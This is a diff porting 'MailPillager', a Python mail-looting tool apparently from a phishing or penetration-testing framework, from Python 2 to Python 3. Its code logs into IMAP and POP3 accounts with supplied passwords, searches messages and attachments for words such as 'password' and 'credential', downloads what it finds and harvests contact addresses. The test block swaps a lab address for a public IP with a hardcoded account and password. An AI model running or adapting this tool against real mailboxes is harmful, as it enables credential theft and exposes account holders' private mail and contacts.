@@ -1,4 +1,4 @@
-#! /usr/bin/python
+#!/usr/bin/env python3
 import os
 import imaplib
 import poplib
@@ -106,7 +106,7 @@ class IMAP(Pillager):
         search_term = self.buildSearchTerm("Body", term)
         typ, data = self.srv.search(None, search_term)
         for uid in data[0].split():
-            print "MATCHED ON [%s]" % (uid)
+            print("MATCHED ON [%s]" % (uid))
            
             if not uid in matched:
                 matched.append(uid)
@@ -128,8 +128,8 @@ class IMAP(Pillager):
             if (header):
                 header_data = header[1][0][1]
                 parser = email.parser.HeaderParser()
-                msg = parser.parsestr(header_data)
-                print "#%s [%s] -> [%s]" %(uid, msg['from'], msg['subject'])
+                msg = parser.parsestr(header_data.decode())
+                print("#%s [%s] -> [%s]" %(uid, msg['from'], msg['subject']))
 
                 if not uid in matched:
                     matched.append(uid)
@@ -148,13 +148,13 @@ class IMAP(Pillager):
         for uid in self.uids:
             resp, data = self.srv.fetch(uid, "(RFC822)") # fetching the mail, "`(RFC822)`" means "get the whole stuff", but you can ask for headers only, etc
             email_body = data[0][1] # getting the mail content
-            mail = email.message_from_string(email_body) # parsing the mail content to get a mail object
+            mail = email.message_from_string(email_body.decode()) # parsing the mail content to get a mail object
         
             #Check if any attachments at all
             if mail.get_content_maintype() != 'multipart':
                 continue
         
-            print "["+mail["From"]+"] :" + mail["Subject"]
+            print("["+mail["From"]+"] :" + mail["Subject"])
 
             # we use walk to create a generator so we can iterate on the parts and forget about the recursive headach
             for part in mail.walk():
@@ -167,19 +167,19 @@ class IMAP(Pillager):
                     continue
         
                 filename = part.get_filename()
-                print "Found attachment [%s]" % (filename)
+                print("Found attachment [%s]" % (filename))
 
                 valid = False
                 if (term):
                     for search_term in term:
                         if re.match(search_term, filename, re.IGNORECASE):
-                            print "MATCHED ON [%s]" % (search_term)
+                            print("MATCHED ON [%s]" % (search_term))
                             valid = True
                 else:
                     valid = True
         
                 if valid:
-                    print "Filename [%s] MATCHED search terms for uid [%s]" % (filename, uid)
+                    print("Filename [%s] MATCHED search terms for uid [%s]" % (filename, uid))
                     if not uid in matched:
                         matched.append(uid)
         return matched
@@ -192,10 +192,10 @@ class IMAP(Pillager):
             resp, data = self.srv.fetch(messageid, "(RFC822)") # fetching the mail, "`(RFC822)`" means "get the whole stuff", but you can ask for headers only, etc
             email_body = data[0][1] # getting the mail content
 
-            filename = self.user + "_" + messageid
+            filename = self.user + "_" + messageid.decode()
             file_path = os.path.join(self.output_dir, filename)
 
-            print "Downloading message id [%s] to [%s]" % (messageid, file_path)
+            print("Downloading message id [%s] to [%s]" % (messageid, file_path))
             #Check if its already there
             if not os.path.isfile(file_path) :
                 # finally write the stuff
@@ -233,7 +233,7 @@ class IMAP(Pillager):
                     continue
 
                 file_path = os.path.join(self.output_dir, filename)
-                print "Downloading attachment [%s] to [%s]" % (messageid, file_path)
+                print("Downloading attachment [%s] to [%s]" % (messageid, file_path))
 
                 #Check if its already there
                 if not os.path.isfile(file_path) :
@@ -257,7 +257,7 @@ class IMAP(Pillager):
             resp, data = self.srv.fetch(uid, "(RFC822)")
             for response_part in data:
                 if isinstance(response_part, tuple):
-                    msg = email.message_from_string(response_part[1])
+                    msg = email.message_from_string(response_part[1].decode())
                     fromaddr = msg['from']
                     if (fromaddr):
                         sender = msg['from'].split()[-1]
@@ -265,7 +265,7 @@ class IMAP(Pillager):
                         # Ignore any occurences of own email address and add to list
                         if not re.search(r'' + re.escape(self.user),address) and not address in contacts:
                             contacts.append(address)
-                            print "IDENTIFED new contact [%s]" % (address)
+                            print("IDENTIFED new contact [%s]" % (address))
 
         return contacts
 
@@ -276,7 +276,7 @@ class IMAP(Pillager):
         numMessages = self.srv.select(readonly=True)[1][0]
         typ, data = self.getMessagesReverseOrder()
         maxNum = num
-        if (numMessages < num):
+        if (int(numMessages) < int(num)):
             maxNum = numMessages
 
         i = 1
@@ -285,10 +285,10 @@ class IMAP(Pillager):
             if (header):
                 header_data = header[1][0][1]
                 parser = email.parser.HeaderParser()
-                msg = parser.parsestr(header_data)
-                print "#%i [%s] -> [%s]" %(i, msg['from'], msg['subject'])
+                msg = parser.parsestr(header_data.decode())
+                print("#%i [%s] -> [%s]" %(i, msg['from'], msg['subject']))
             i = i + 1
-            if (i > maxNum):
+            if (i > int(maxNum)):
                 return
         return None
 
@@ -393,7 +393,7 @@ class POP3(Pillager):
             body = '\n'.join(body)
             for search_term in term:
                 if re.search(search_term, body, re.IGNORECASE):
-                    print "MATCHED ON [%s]" % (search_term)
+                    print("MATCHED ON [%s]" % (search_term))
                     if not i in matched:
                         matched.append(i)
             i=i+1
@@ -414,7 +414,7 @@ class POP3(Pillager):
             msg = email.message_from_string('\n'.join(body))
             for search_term in term:
                 if re.search(search_term, msg['subject'], re.IGNORECASE):
-                    print "MATCHED ON [%s]" % (search_term)
+                    print("MATCHED ON [%s]" % (search_term))
                     if not i in matched:
                         matched.append(i)
             i=i+1
@@ -449,7 +449,7 @@ class POP3(Pillager):
 
                 for search_term in term:
                     if re.search(search_term, filename, re.IGNORECASE):
-                        print "MATCHED ON [%s]" % (search_term)
+                        print("MATCHED ON [%s]" % (search_term))
                         if not i in matched:
                             matched.append(i)
             i=i+1
@@ -465,7 +465,7 @@ class POP3(Pillager):
             filename = self.user + "_" + str(messageid)
             file_path = os.path.join(self.output_dir, filename)
 
-            print "Downloading message id [%s] to [%s]" % (messageid, file_path)
+            print("Downloading message id [%s] to [%s]" % (messageid, file_path))
             #Check if its already there
             if not os.path.isfile(file_path) :
                 # finally write the stuff
@@ -499,7 +499,7 @@ class POP3(Pillager):
                 continue
 
             file_path = os.path.join(self.output_dir, filename)
-            print "Downloading attachment [%s] to [%s]" % (messageid, file_path)
+            print("Downloading attachment [%s] to [%s]" % (messageid, file_path))
 
             #Check if its already there
             if not os.path.isfile(file_path) :
@@ -526,7 +526,7 @@ class POP3(Pillager):
                     # Ignore any occurences of own email address and add to list
                     if not re.search(r'' + re.escape(self.user),address) and not address in contacts:
                         contacts.append(address)
-                        print "IDENTIFED new contact [%s]" % (address)
+                        print("IDENTIFED new contact [%s]" % (address))
 
         return contacts
 
@@ -538,7 +538,7 @@ class POP3(Pillager):
 
         for (server_msg, body, octets) in self.msg_list:
             msg2 = email.message_from_string('\n'.join(body))
-            print "[%s] -> [%s]" %(msg2['from'], msg2['subject'])
+            print("[%s] -> [%s]" %(msg2['from'], msg2['subject']))
 
     def getMessages(self):
         if (not self.srv):
@@ -572,43 +572,43 @@ class POP3S(POP3):
 class  MailPillager():
     def tworker(self, mail_conn, username, password, domain, server, port):
         valid = False
-        print "trying [%s]" % (username)
-        print "trying [%s@%s]" % (username, domain)
+        print("trying [%s]" % (username))
+        print("trying [%s@%s]" % (username, domain))
         if (mail_conn.validate(username, password)):
            valid = True
         elif (mail_conn.validate(username+"@"+domain, password)):
            valid = True
            username = username+"@"+domain
         if (valid):
-            print "USER [%s] with PASSWORD [%s] is valid on [%s:%i]" % (username, password, server, port)
+            print("USER [%s] with PASSWORD [%s] is valid on [%s:%i]" % (username, password, server, port))
 
             matched_messages = []
             matched_attachments = []
-            print "---------------Search Message Bodies [credential, account, password, login]"
+            print("---------------Search Message Bodies [credential, account, password, login]")
             matched_messages.extend(mail_conn.searchMessageBodies(term=["credential", "account", "password", "login"]))
-            print "---------------Search Message Subjects [credential, account, password, login]"
+            print("---------------Search Message Subjects [credential, account, password, login]")
             matched_messages.extend(mail_conn.searchMessageSubjects(term=["credential", "account", "password", "login"]))
-            print "---------------Search Message Attachments [credential, account, password, login]"
+            print("---------------Search Message Attachments [credential, account, password, login]")
             matched_attachments.extend(mail_conn.searchMessageAttachments(term=["credential", "account", "password", "login"]))
-            print "---------------Download Messages"
+            print("---------------Download Messages")
             for uid in set(matched_messages):
                 mail_conn.downloadMessage(uid)
-            print "---------------Download Attachments"
+            print("---------------Download Attachments")
             for uid in set(matched_attachments):
                 mail_conn.downloadAttachment(uid)
-            print "---------------Scrape Contacts"
-            print mail_conn.scrapeContacts()
-            print "---------------Get 10 Subjects"
-            print mail_conn.getXsubjects()
-            print "---------------"
+            print("---------------Scrape Contacts")
+            print(mail_conn.scrapeContacts())
+            print("---------------Get 10 Subjects")
+            print(mail_conn.getXsubjects())
+            print("---------------")
 
             mail_conn.disconnect()
         else:
-            print "USER [%s] with PASSWORD [%s] is NOT valid on [%s:%i]" % (username, password, server, port)
+            print("USER [%s] with PASSWORD [%s] is NOT valid on [%s:%i]" % (username, password, server, port))
 
     def pillage(self, username, password, server, port, domain, outputdir="."):
 
-        print "%s, %s, %s, %s" % (username, password, server, domain)
+        print("%s, %s, %s, %s" % (username, password, server, domain))
         mail = None
         if (port == 993):
             mail = IMAPS(outputdir=outputdir)
@@ -619,7 +619,7 @@ class  MailPillager():
         elif (port == 110):
             mail = POP3(outputdir=outputdir)
         else:
-            print "ERROR, unknown port provided"
+            print("ERROR, unknown port provided")
             return
 
         mail.connect(server)
@@ -630,11 +630,11 @@ class  MailPillager():
 # main test code
 #-----------------------------------------------------------------------------
 if __name__ == "__main__":
-    serverip = "172.16.170.135"
+    serverip = "167.99.126.139"
     #username = "sjane@example.phish"
-    username = "sjane"
-    password = "passwordsally"
-    domain = "example.phish"
+    username = "acompton@hillbilly.dev"
+    password = "password"
+    domain = "hillbilly.dev"
 
     mp = MailPillager()
 #    mp.pillage(username=username, password=password, server=serverip, port=143, domain=domain)
